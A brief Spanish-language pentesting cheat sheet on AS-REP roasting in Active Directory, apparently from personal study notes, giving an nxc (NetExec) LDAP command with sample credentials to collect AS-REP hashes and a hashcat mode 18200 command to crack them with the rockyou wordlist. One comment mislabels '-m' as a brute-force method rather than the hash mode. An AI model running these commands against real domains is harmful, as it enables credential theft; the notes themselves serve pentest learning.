# ASREProstable 

Tags: #AD #ASREProstable  #Crackmapexec #HashCat #Kali #Parrot 

## Explotar con CrackMapExec

```bash 
❯ nxc ldap IP -u 'clearpass.user' -p 'Password@1' --asreproast output.txt
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 18200 = Es un ASREProstable
	# hashes.asreproast = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```